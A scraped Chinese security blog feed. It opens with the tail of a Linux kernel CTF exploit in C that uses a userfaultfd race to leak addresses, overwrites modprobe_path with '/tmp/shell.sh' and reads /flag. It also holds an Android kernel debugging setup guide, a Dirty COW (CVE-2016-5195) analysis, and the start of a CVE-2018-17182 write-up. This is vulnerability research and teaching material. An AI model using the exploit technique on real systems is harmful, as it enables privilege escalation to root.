punctuation">;</span>    <span class="token function">register_userfault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> FAULT_PAGE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">hexdump</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>FAULT_PAGE<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t heapaddr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>FAULT_PAGE <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t codeaddr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>FAULT_PAGE <span class="token operator">+</span> <span class="token number">0x2b0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xdef0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>heapaddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"race failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    modprobe_path <span class="token operator">=</span> codeaddr <span class="token operator">+</span> <span class="token number">0xe955c0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lx"</span><span class="token punctuation">,</span> modprobe_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] heapaddr:0x%lx codeaddr:0x%lx\n"</span><span class="token punctuation">,</span> heapaddr<span class="token punctuation">,</span> codeaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sem lock"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">register_userfault2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sem_wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>done<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> FAULT_PAGE2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">edit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64_t<span class="token punctuation">)</span><span class="token string">"/tmp/shell.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">char</span> flag_buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wait ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> file_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>file_fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"open flag error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">,</span> flag_buf<span class="token punctuation">,</span> <span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span>flag_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">char</span> <span class="token operator">*</span>my_args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/tmp/wrong_elf"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">execve</span><span class="token punctuation">(</span>my_args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> my_args<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 对于很多条件竞争的洞，本来的触发其实是很困难的，但是我们可以用一些技巧来使得竞争变得更加稳定，userfaultfd算是其中之一，之前学习过的CVE-2019-13272，exp的作者也是使用了类似的手法，通过把一个block_pipe重定向到stdout来阻塞进程，从而控制竞争的效果。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF linux kernel race </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓内核调试初试</title>
      <link href="/2020/03/17/an-zhuo-nei-he-diao-shi-chu-shi/"/>
      <url>/2020/03/17/an-zhuo-nei-he-diao-shi-chu-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Adroid-Studio"><a href="#Adroid-Studio" class="headerlink" title="Adroid Studio"></a>Adroid Studio</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载地址: <a href="https://developer.android.com/studio" target="_blank" rel="noopener">https://developer.android.com/studio</a><br>如果觉得android studio太大了，可以只下载Command line tools，我这里直接装studio比较省事。一般studio里面会内置基于qemu的emulator，我们主要就是需要这个用来模拟安卓设备。</p><h2 id="安装Android-Studio"><a href="#安装Android-Studio" class="headerlink" title="安装Android Studio"></a>安装Android Studio</h2><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">mkdir</span> android_sdk <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> android_sdk   <span class="token function">tar</span> -xf android-studio-ide-192.6241897-linux.tar.gz   <span class="token function">cd</span> ./android-studio/bin/   ./studio.sh  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 按照引导安装完毕，这里注意要想使用emulator，需要cpu支持VT虚拟化，我的环境是虚拟机，所以直接在vm的cpu设置里面勾选即可。安装完后，在home目录下会新建一个~/Android/Sdk目录，进入这里就能看到里面Sdk安装的Sdk tools，添加一下环境变量，来更方便的使用各种工具。  </p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">export</span> PATH<span class="token operator">=</span>/path/to/Android/platform-tools:<span class="token variable">$PATH</span>   <span class="token function">export</span> PATH<span class="token operator">=</span>/path/to/Android/emulator:<span class="token variable">$PATH</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 再执行命令添加环境变量，这样就能在任意一个目录执行studio.sh打开程序了。  </p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">export</span> PATH<span class="token operator">=</span>/path/to/android-studio/bin/:<span class="token variable">$PATH</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建avd"><a href="#创建avd" class="headerlink" title="创建avd"></a>创建avd</h2><p> 打开android studio，在Configure选项卡中打开AVD Manager，点击Create，我这里选择的设备是Pixel 2，system image可以选择x86架构，x86_64，arm64，armeabi。看自己情况选择，我这里选择了arm64-v8a, api level为25的image，后面选择finish即可创建一个avd。<br> 查看创建是否成功  </p><pre class="line-numbers language-bash"><code class="language-bash"> $ emulator -list-avds   Pixel_2_API_25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 启动虚拟环境  </p><pre class="line-numbers language-bash"><code class="language-bash"> emulator -avd Pixel_2_API_25 -no-audio -no-boot-anim -no-window -no-snapshot  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 查看当前虚拟环境的内核版本  </p><pre class="line-numbers language-bash"><code class="language-bash"> $ adb shell <span class="token function">uname</span> -a   Linux loca 3.10.0+ <span class="token comment" spellcheck="true">#258 SMP PREEMPT Fri May 19 12:03:16 PDT 2017 aarch64  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h1><h2 id="下载goldfish源代码和工具链"><a href="#下载goldfish源代码和工具链" class="headerlink" title="下载goldfish源代码和工具链"></a>下载goldfish源代码和工具链</h2><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">git</span> clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git   <span class="token function">git</span> clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6   <span class="token function">git</span> clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/x86/x86_64-linux-android-4.7   <span class="token function">git</span> clone https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.8  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 上面三个分别是编译arm，x86_64，aarch64架构安卓内核所需的工具链，视自己的需求决定用哪一个。我这里使用aarch64-linux-android-4.8进行编译。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p> Goldfish是一种虚拟的ARM处理器，在android的仿真环境中使用。这里由于之前查看虚拟环境时看到的内核版本为3.10，为了兼容我这里也选择编译3.10内核。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">git</span> branch -a   <span class="token function">git</span> checkout -t remotes/origin/android-goldfish-3.10 -b goldfish3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 在执行make前，需要配置好相关的环境变量。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">export</span> ARCH<span class="token operator">=</span>arm64 <span class="token function">export</span> PATH<span class="token operator">=</span>/path/to/aarch64-linux-android-4.8/bin/:<span class="token variable">$PATH</span> <span class="token function">export</span> CROSS_COMPILE<span class="token operator">=</span>aarch64-linux-android-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 可以在/path/to/goldfish/arch/arm64/configs目录下查看源代码自带的arm64的config文件。我们这里选择ranchu_defconfig。然后在ranchu_defconfig的基础上执行make menuconfig 添加 Compile the kernel with debug info、Enable dynamic printk() support、KGDB的选项。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">make</span> ranchu_defconfig <span class="token function">make</span> menuconfig <span class="token function">make</span> -j4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 安卓内核编译速度很快几分钟就搞定了。我们从goldfish根目录下拿到vmlinux用作gdb调试的符号文件，再从/path/to/goldfish/arch/arm64/boot/目录下拿到Image文件来替换虚拟安卓环境的映像。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p> 使用emulator启动安卓虚拟环境。emulator参数的含义参考<a href="https://developer.android.com/studio/run/emulator-commandline" target="_blank" rel="noopener">https://developer.android.com/studio/run/emulator-commandline</a></p><pre class="line-numbers language-bash"><code class="language-bash"> emulator  -show-kernel -kernel ./Image -avd Pixel_2_API_25 -no-audio -no-boot-anim -no-window -no-snapshot -qemu -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 启动之后终端会显示各种内核的调试信息，我们在另外一个终端使用adb shell进入虚拟环境  </p><pre class="line-numbers language-bash"><code class="language-bash"> $ adb shell generic_arm64:/ $ <span class="token function">uname</span> -a Linux loca 3.10.0+ <span class="token comment" spellcheck="true">#1 SMP PREEMPT Mon Mar 16 20:25:26 CST 2020 aarch64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 此时内核版本已经替换成我们编译的Image映像了。</p><h1 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h1><h2 id="编译gdb"><a href="#编译gdb" class="headerlink" title="编译gdb"></a>编译gdb</h2><p> 因为前面下载的工具链里面对应版本的gdb版本都太低了，而且有的不支持python，还有的是python2版本的，这样我们调试的时候就不能使用插件来提升效率了(gdb的插件目前支持arm的好像只有gef，而gef需要python3)。所以我们这里自行交叉编译gdb。因为是调试内核所以gdbserver就不需要了。gdb源码下载地址 <a href="https://mirrors.tuna.tsinghua.edu.cn/gnu/gdb/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/gnu/gdb/</a>, 我这里选择的版本是7.11.1。解压压缩包后，配置好config，然后即可编译。如果是要调试其他架构的内核的话，只需要把target选项给换成对应的即可。</p><pre class="line-numbers language-bash"><code class="language-bash"> ./configure --target<span class="token operator">=</span>aarch64-linux-gnueabi --with-python<span class="token operator">=</span>/usr/bin/python3 <span class="token function">make</span> -j4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 从/path/to/gdbsource/gdb/目录拿到对应的gdb bin文件，需要注意的是，如果直接从当前目录./gdb这样运行gdb会报错，应该要这样</p><pre class="line-numbers language-bash"><code class="language-bash"> ./gdb -data-directory /usr/share/gdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 如果觉得麻烦的话，就将当前gdb bin文件所在的目录添加进环境变量。  </p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p> 先启动虚拟环境，随后使用gdb进行调试。</p><pre class="line-numbers language-bash"><code class="language-bash"> $ aarch64-linux-android-gdb -q vmlinux GEF <span class="token keyword">for</span> linux ready, <span class="token function">type</span> `gef<span class="token string">' to start, `gef config'</span> to configure 80 commands loaded <span class="token keyword">for</span> GDB 7.11.1 using Python engine 3.5 Reading symbols from vmlinux<span class="token punctuation">..</span>.done. gef➤  target remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="0.png" alt="gdb1"><br> 这样调试环境就初步准备就绪了。</p><p><strong>Reference</strong><br><a href="https://zhuanlan.zhihu.com/p/56718840" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/56718840</a><br><a href="http://pwn4.fun/2016/08/19/Android%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95/" target="_blank" rel="noopener">http://pwn4.fun/2016/08/19/Android%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95/</a><br><a href="https://blog.csdn.net/zhangjg_blog/article/details/84291663" target="_blank" rel="noopener">https://blog.csdn.net/zhangjg_blog/article/details/84291663</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> android linux kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-5195 脏牛漏洞复现笔记</title>
      <link href="/2020/03/11/cve-2016-5195/"/>
      <url>/2020/03/11/cve-2016-5195/</url>
      
        <content type="html"><![CDATA[<p><img src="0.jpg" alt="dirty cow"></p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>(CVE-2016-5195)脏牛漏洞是一个影响范围十分广的本地提权漏洞，影响2.6.22 (released in 2007) 以后的所有内核版本，在2016年10月18日被修复。漏洞发现者Phil Oester发现在linux kernel的内存子系统在处理 copy-on-write (COW) 的时候可以引起条件竞争，从而可以对只读内存页进行修改，比如说对su或者passwd程序进行修改，从而达到提权的目的。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Copy-On-Write介绍"><a href="#Copy-On-Write介绍" class="headerlink" title="Copy-On-Write介绍"></a>Copy-On-Write介绍</h2><p>COW技术被主要用在共享虚拟内存和fork系统调用执行的时候。当一个进程执行fork函数刚刚创建一个新的进程的时候，并不会修改任何的内存。因此每次执行fork的时候就创建一块新的内存页并且复制原有进程的code page是一种很浪费的操作，COW指的就是当新创建的进程执行execl之类的函数的时候，需要对code page进行修改的时候，才真正给它分配一块独立的内存。除此之外，COW还运用在另外一种情况，当进程想对一页only read 物理内存页进行写操作时，操作系统会将其拦截下来，然后复制并分配一块新的可写的物理页（如果only read物理内存页的引用计数只有1的话，就直接引用原有的页，不会分配新的），然后内核会修改页表使得原有的page table entry指向这块新的物理页，对原有的物理页的引用计数减一，然后对新的物理页执行写入操作。这样，写入的操作对于其他共享这块only read内存页的进程就是不可见的了。详情参见<a href="https://en.wikipedia.org/wiki/Copy-on-write" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Copy-on-write</a>。</p><h2 id="POC运行-amp-分析"><a href="#POC运行-amp-分析" class="headerlink" title="POC运行&amp;分析"></a>POC运行&amp;分析</h2><p>复现环境：Linux Ubuntu 4.4.0-21-generic<br>poc地址 <a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a>  </p><p><img src="1.png" alt="run poc1"><br><img src="2.png" alt="run poc2"><br><img src="3.png" alt="run poc3">  </p><p>大概意思就是用root创建了一个只读文件，然后执行poc把只读文件给篡改了。<br>在来看看poc的代码。</p><p><img src="4.png" alt="dirtyc0w.c1"><br>main函数中主要是将foo只读文件用mmap映射到内存中，然后创建了madvice和procselfmem两个线程。<br>　　　　　　<img src="5.png" alt="drityc0w.c2"><br>madvice线程中，一直不断运行带有MADV_DONTNEED标识的madvice函数，这个函数的作用是告诉内核map这块内存不需要了，内核将会回收物理内存页。<br>　　　　　　<img src="6.png" alt="dirtyc0w.c3">　　<br>procselfmem线程中，打开/proc/self/mem文件，然后将读写指针移动到map，然后对其进行写操作，这里说明一下/proc/self/mem文件，这个文件指向的是进程本身的内存，通常调试器改写程序内存就是通过这个文件进行读写，所以这里能够对只读内存页map重复进行写操作而不会触发segmentation。<br>很容易看出来，这两个线程存在条件竞争，当procselfmem对只读内存进行写操作时会触发cow机制，但是madvice会干扰这个cow的过程，使得cow失败，这样就能将已经dirty的page不按照cow的过程写入只读文件。<br>另外一种方法使用ptrace系统调用写文件映射内存的原理和上面其实也差不多。参见<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</a></p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><ul><li><p>脏牛漏洞出现在get_user_pages函数中，这个函数能够根据虚拟地址得到对应的物理地址。follow_page_mask函数在get_user_pages函数中被调用，他的作用是从页表中获取指定地址的物理页，当页表中没有此物理页时或者对foll_flags所代表的内存访问语义做检查时发现和内存页中的权限配置不一样时，就返回0，否则就返回对应的物理页。当返回0时，就调用faultin_page函数来对错误进行处理。</p></li><li><p>具体的流程已经有大佬分析的很透彻了，参见<br><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</a><br><a href="https://www.anquanke.com/post/id/84851" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84851</a><br><a href="https://blog.jenisec.org/security/hugedirtycow.html" target="_blank" rel="noopener">https://blog.jenisec.org/security/hugedirtycow.html</a><br>我这里搭建qemu的调试环境来把COW的三次entry循环走一遍(内核版本为4.8.1)。<br><img src="7.png" alt="func call stack">  </p></li><li><p>首先是get_user_pages函数的触发，通过调试得到如上函数调用栈<br><img src="8.png" alt="first follow_page_mask"></p></li><li><p>在__get_user_pages中，因为这是第一次访问map，所以页表中没有相对应的page table entry，所以第一次调用follow_page_mask带有FOLL_WRITE返回0，必须提的是在调用follow_page_mask之前还调用了cond_resched()函数，这个函数会通知内核先优先调用其他线程，所以这就很容易导致竞争。由于follow_page_mask返回0，就是没有找到page，然后就会进入faultin_page函数。<br><img src="9.png" alt="first faultin_page"></p></li><li><p>第一次调用faultin_page,因为带有FOLL_WRITE，在一开始被设置了fault_flags |= FAULT_FLAG_WRITE。然后因为没有相对应的pte，所以在faultin_page中创建了pte和物理内存页并初始化，然后还调用了maybe_mkwrite(pte_mkdirty(entry), vma)标记此页dirty，但是要注意此时此物理内存页仍然是只读的。从上面的调试中可以看到第一次调用faultin_page返回0，于是又重新回到entry。<br><img src="10.png" alt="second follow_page_mask"></p></li><li><p>第二次调用follow_page_mask函数，带有FOLL_WRITE，这一次有相对应的pte了，可是follow_page_pte中有一个if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))判断过不了，所以返回NULL，follow_page_mask也返回NULL。于是导致第二次进入faultin_page函数。<br><img src="11.png" alt="second faultin_page"></p></li><li><p>第二次调用faultin_page函数，仍然带有FOLL_WRITE，在handle_pte_fault函数中，因为在faultin_page函数一开始就设置了FAULT_FLAG_WRITE位，且pte_write函数返回0，这时会进入do_wp_page函数中。do_wp_page函数会判断此内存页是否要复制一份，由于这个物理内存页引用计数只有1，所以不会被复制一份，在do_wp_page函数里面又会调用wp_page_reuse函数，在wp_page_reuse函数中，又会运行maybe_mkwrite(pte_mkdirty(entry), vma)，将pte标记为dirty，但此时此物理页，仍然是只读的。但是wp_page_reuse函数返回值是VM_FAULT_WRITE，所以do_wp_page和handle_pte_fault也返回VM_FAULT_WRITE，最后handle_mm_fault也返回VM_FAULT_WRITE，这样在faultin_page函数后面会有 if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))这样的一个判断，最后判断为真，运行*flags &amp;= ~FOLL_WRITE，会将FOLL_WRITE给置为0。第二次faultin_page函数同样也返回0，于是便进入第三次entry。<br><img src="12.png" alt="third follow_page_mask"></p></li><li><p>第三次调用follow_page_mask函数，不带有FOLL_WRITE，而且pte也存在，这样第三次follow_page_mask就能返回一个合法的物理内存页，最后write系统调用成功写入这个物理页。但是由于这是COW机制分配出来的物理页，最后内存页释放的时候，并不会重新写入文件。<br>我们要想成功将这个物理内存页写入文件，就得让操作系统认为这不是一个COW机制下的内存页，方法就是在第三次调用cond_resched的时候，调用madvice通过竞争释放掉这块内存页，但是此时的foll_flags结构里面的FOLL_WRITE已经被置0了，这样在第三次进入follow_page_mask的时候，不带FOLL_WRITE但是没有相对应的pte，返回0。这样会调用第三次不带有FOLL_WRITE也没有pte的faultin_page函数，相比于第一次而言，由于不带有FOLL_WRITE，内核只会检查可读性，不会有FAULT_FLAG_WRITE标记，所以在do_fault函数中会调用do_read_fault。<br><img src="13.png" alt="do_read_fault">  </p></li><li><p>最后在faultin_page函数中返回0，又重新返回entry。<br><img src="14.png" alt="fouth follow_page_mask"></p></li><li><p>第四次调用follow_page_mask函数，不带有FOLL_WRITE且pte存在，这样follow_page_mask会返回一个合法的page，注意这个page不是COW机制下的，而是变成了文件的原始页，因此当这个page被释放的时候，会将其写入文件中。这样我们就成功修改了只读文件。<br><img src="15.png" alt="write syscall ret"></p></li><li><p>由于已经得到了page，write系统调用将成功写入map并返回。<br>至此脏牛漏洞调试结束。</p></li></ul><h1 id="分析patch"><a href="#分析patch" class="headerlink" title="分析patch"></a>分析patch</h1><ul><li><p>patch地址<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</a><br><img src="16.png" alt="patch"></p></li><li><p>patch中新加入了一个宏标志FOLL_COW，先来看看faultin_page中的改变，当kernel判断是要生成一个COW页的时候，他不会将FOLL_WRITE标记给置零了，而是给flags新添了一个FOLL_COW标记，标识这个页是COW机制产生的。所以即便产生竞争，FOLL_WRITE位还是为1的，又会重新进行一次COW循环。</p></li><li><p>因为标记COW页的方式变了，相应的follow_page_pte中对于判断页是否可写的条件也发生了变化。当FOLL_WRITE标记存在时，说明内核要检查页是否有可写的权限，这时改用can_follow_write_pte取代pte_write进行检查，can_follow_write_pte返回true的条件是要么pte有可写的标志，要么这个页有FOLL_FORCE位同时又有FOLL_COW(说明已经经过一次完整的COW循环)，且pte中有dirty标识。</p></li><li><p>commit 的原文是 FOLL_FORCE can write to even unwritable pte’s, but only<br>after we’ve gone through a COW cycle and they are dirty.</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux kernel race </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-17182 VMA use after free 复现笔记</title>
      <link href="/2020/03/07/cve-2018-17182/"/>
      <url>/2020/03/07/cve-2018-17182/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2018-17182-VMA-use-after-free-复现笔记"><a href="#CVE-2018-17182-VMA-use-after-free-复现笔记" class="headerlink" title="CVE-2018-17182 VMA use after free 复现笔记"></a>CVE-2018-17182 VMA use after free 复现笔记</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p> An issue was discovered in the Linux kernel through 4.18.8. The vmacache_flush_all function in mm/vmacache.c mishandles sequence number overflows. An attacker can trigger a use-after-free (and possibly gain privileges) via certain thread creation, map, unmap, invalidation, and dereference operations.<br>意思大概是在Linux内核4.18.8中的vmacache_flush_all函数中的对于seq number的溢出处理不适当导致的UAF漏洞，可以导致提权。影响的Linux发行版有<br><img src="1.png" alt="1"></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Linux-虚拟内存系统"><a href="#Linux-虚拟内存系统" class="headerlink" title="Linux 虚拟内存系统"></a><strong>Linux 虚拟内存系统</strong></h2><p>Linux内核主要由mm_struct结构体来进行管理，如下图<br><img src="2.png" alt="2"></p><p>  mm_struct在task_struct进程描述符中被称为内存描述符，他是一个可执行程序的内存结构概要.如上图所示，它存储了内存各个内存端的起始位置和结束位置，进程使用的物理内存页的数量，进程使用的虚拟地址空间等信息。在内存描述符内部，还有两个内存管理的重要结构：virtual memory areas和page tables。下图就是Gonzo的内存区域示意图：</p><p><img src="3.png" alt="3"><br> 每一个virtual memory 